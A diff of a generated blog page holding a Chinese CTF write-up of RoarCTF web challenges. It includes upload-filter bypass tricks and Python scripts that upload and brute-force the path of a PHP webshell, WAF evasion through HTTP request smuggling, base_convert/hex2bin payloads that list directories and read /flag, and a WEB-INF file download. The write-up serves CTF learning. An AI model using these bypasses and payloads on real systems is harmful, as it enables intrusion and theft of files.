@@ -406,9 +406,9 @@ height:50vh;
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h4><h5 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h5><p>听说这个是0day，拿来出题的，是用的thinkphp写的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>构造上传包，fuzz后使用<code>xxxx.&lt;&gt;php</code>绕过上传检测</p>
-<p><img src="images\1.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/1.png" alt></p>
 <p>上传成功，访问shell即可拿到flag。</p>
-<p><img src="images\2.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/2.png" alt></p>
 <h5 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h5><p>ThinkPHP默认上传文件名是递增的。代码中ThinkPHP的后缀过滤无效，所以通过上传多个文件的方式，绕过.php后缀的判断，文件名，需要爆破</p>
 <p>写脚本上传一个正常文件，再上传多个文件，再上传一个正常文件。然后获取到第一三次上传的文件名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/index.php/Home/Index/upload"</span></span><br><span class="line"></span><br><span class="line">files1 = &#123;<span class="string">'file'</span>: open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line">files2 = &#123;<span class="string">'file[]'</span>: open(<span class="string">'test.php'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files2)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>
@@ -416,19 +416,19 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">"1234567890abcdef"</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">	<span class="keyword">for</span> j in s:</span><br><span class="line">		<span class="keyword">for</span> k in s:</span><br><span class="line">			<span class="keyword">for</span> l in s:</span><br><span class="line">				url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc%s%s%s%s.php"</span>%(i,j,k,l)</span><br><span class="line">				r = requests.get(url)</span><br><span class="line"><span class="comment">#				print(url)</span></span><br><span class="line">				<span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">					<span class="keyword">print</span>(url)</span><br><span class="line">					<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>爆破到文件名后，即可访问上传的木马，拿到flag</p>
 <h4 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h4><p>这题首先进去发现是一个计算器的题目。</p>
-<p><img src="images\7.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/7.png" alt></p>
 <p>这道题是国赛的<strong>love_math</strong>的修改版，除去了长度限制，payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符，不同的是网站加了waf，需要绕过waf。首先需要绕过waf，测试发现当我们提交一些字符时，会直接403，经测试发现存在服务器存在http走私漏洞，可以用来绕waf，详情见：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
-<p><img src="images\10.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/10.png" alt></p>
 <p>因为禁掉了一些字符，所以导致我们不能直接getflag，继续分析payload构造</p>
 <p>这里用到几个php几个数学函数。</p>
 <p>我们首先要构造列目录的payload，肯定要使用<code>scandir</code>函数，尝试构造列举根目录下的文件。<code>scandir</code>可以用<code>base_convert</code>函数构造，但是利用<code>base_convert</code>只能解决<code>a~z</code>的利用，因为根目录需要<code>/</code>符号，且不在<code>a~z</code>,所以需要<code>hex2bin(dechex(47))</code>这种构造方式，<code>dechex()</code> 函数把十进制数转换为十六进制数。<code>hex2bin()</code> 函数把十六进制值的字符串转换为 ASCII 字符。</p>
-<p><img src="images\6.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/6.png" alt></p>
 <p>构造读取flag，使用<code>readfile</code>函数，paload：<code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code>，方法类似</p>
-<p><img src="images\3.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/3.png" alt></p>
 <h4 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h4><p>这道进去首先想到的就是任意文件下载，但是刚开始用<code>GET</code>方式一直什么都下载不了，连网站确定目录的图片都下不了。后来修改为post，可以了。。。</p>
-<p><img src="images\4.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/4.png" alt></p>
 <p>尝试读取<code>WEB-INF/web.xml</code>发现操作flag的关键文件位置</p>
-<p><img src="images\5.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/RoarCTF/5.png" alt></p>
 <p>将图中base64解码即flag。</p>
 
     </article>
@@ -1121,6 +1121,34 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 38
@@ -1199,12 +1227,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
         </li>
     
     
@@ -1289,17 +1317,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
         </li>
     
     
@@ -1343,13 +1371,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
     
-        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
     
-        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
-    
         <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
         <span class="sidebar-tag-name" data-tags="tips"><span class="iconfont-archer">&#xe606;</span>tips</span>
     
@@ -1357,9 +1385,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
@@ -1367,19 +1395,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
-        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
     
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
         <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
     
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
-    
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
